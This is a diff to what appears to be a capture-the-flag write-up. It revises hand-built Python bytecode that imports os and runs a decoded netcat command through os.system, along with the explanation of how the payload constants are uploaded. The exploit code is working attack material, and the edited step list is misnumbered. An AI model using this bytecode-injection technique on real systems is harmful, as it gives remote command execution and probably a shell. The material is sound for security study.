@@ -191,19 +191,16 @@ nc_index = ord("b")
 co_names = ["len", "list", "print", "os", "system", "decode"]
 
 exploit_asm = [
-    # Invoke len(list()) to push 0 onto the stack
-    ("LOAD_NAME", co_names.index("len")),
-    ("LOAD_NAME", co_names.index("list")),
-    ("CALL_FUNCTION", 0),
-    ("CALL_FUNCTION", 1),
+    # Get length of empty list to push 0 on the stack
+    ("BUILD_LIST", 0),
+    # Use NOP as arg to simplify compiler
+    ("GET_LEN", 0x09),
     # Invoke print() to push None onto the stack
     ("LOAD_NAME", co_names.index("print")),
     ("CALL_FUNCTION", 0),
     # Import os
     ("IMPORT_NAME", co_names.index("os")),
-    ("STORE_NAME", co_names.index("os")),
     # Invoke os.system()
-    ("LOAD_NAME", co_names.index("os")),
     ("LOAD_METHOD", co_names.index("system")),
     # Decode first batch of nc command
     ("LOAD_CONST", nc_index),
@@ -219,7 +216,7 @@ exploit_asm = [
     ("CALL_METHOD", 0),
     # Concatenate the three strings
     ("BUILD_STRING", 3),
-    # Finnaly invoke the nc command
+    # Finaly invoke the nc command
     ("CALL_METHOD", 1),
 ]
 ```
@@ -229,7 +226,8 @@ This performs the following:
 1. Invoke `len(list())` to push `0` onto the stack
 2. Invoke `print()` to push `None` onto the stack
 5. Import `os`
-3. Load and decode all three batches of the `nc` command
+3. Load all three batches of the `nc` command
+4. Decode the command batches because `BUILD_STRING` only works with strings and not byte strings
 4. Concatenate the `nc` command
 6. Invoke the `nc` command via `os.system()`
 
@@ -280,7 +278,8 @@ for i in range(num_chunks):
 
 ### Upload additional constants
 
-In order to make the exploit work, we need a few more constants:
+In order to make the exploit work, we need a few more constants.
+These have to be uploaded after the plugins to make sure the plugins can be saved to disk successfully before any entries with invalid filenames are created (e.g. saving the file `plugins/expl` won't work because there is no directory `storage/plugins` but we cannot traverse the path because then the logfile method won't find it since this is operating from the working directory).
 
 Store the filename which is used as "logfile" at index `ord("a")`
 
